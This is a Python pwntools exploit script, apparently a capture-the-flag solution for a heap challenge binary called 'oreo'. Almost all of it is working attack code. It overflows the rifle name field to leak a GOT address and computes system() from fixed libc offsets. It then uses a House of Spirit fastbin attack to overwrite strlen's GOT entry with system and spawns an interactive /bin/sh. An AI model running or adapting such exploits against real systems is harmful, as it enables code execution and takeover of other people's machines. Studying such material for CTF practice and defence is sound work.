#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys

# switches
DEBUG = 1

# modify this
if DEBUG:
    io = process('./oreo') 
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

if DEBUG: context(log_level='debug')
# define symbols and offsets here
msg_addr = 0x804a2a8
strlen_got = 0x804a250
fgets_got = 0x0804a23c

# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def add_rifle(name, des):
	sl('1')
	sl(name)
	if len(des) > 56:
		sn(des)
	else:
		sl(des)
	
def show():
	sl('2')

def order_rifle():
	sl('3')

def leave_msg(string):
	sl('4')
	sl(string)

def print_status():
	sl('5')
# define interactive functions here


# define exploit function here
def pwn():
	
	for i in range(8):
		print_status()
	#prepare for the fastbin size 0x38
	for i in range(0x41-2):
		add_rifle('test', 'test')	
	pay = 'A' * 27
	pay += p32(fgets_got)

	#trigger overflow to get addr
	add_rifle(pay, 'A' * 25) 	
	show()
	ru('===================================')
	ru('===================================')
	ru('Description: ')
	fgets_addr = u32(rn(4))
	info('fgets_addr: ' + hex(fgets_addr))
	system_addr = fgets_addr - 396976 + 242016
	info('system_addr: ' + hex(system_addr))
	
	#house of spirit attack
	payload = ""
	payload += "A"*27
	payload += p32(msg_addr)
	add_rifle(payload, "A"*0x25)

	payload = ""
	payload += p32(0) * 9# size
	payload += p32(0x41)
	payload += p32(0) * 10 # make v2 + 13 == 0 

	leave_msg(payload)
	order_rifle()
	
	add_rifle('name', p32(strlen_got))
	leave_msg(p32(system_addr) + "`;/bin/sh")	
	io.interactive()
	return

if __name__ == '__main__':
    pause()
    pwn()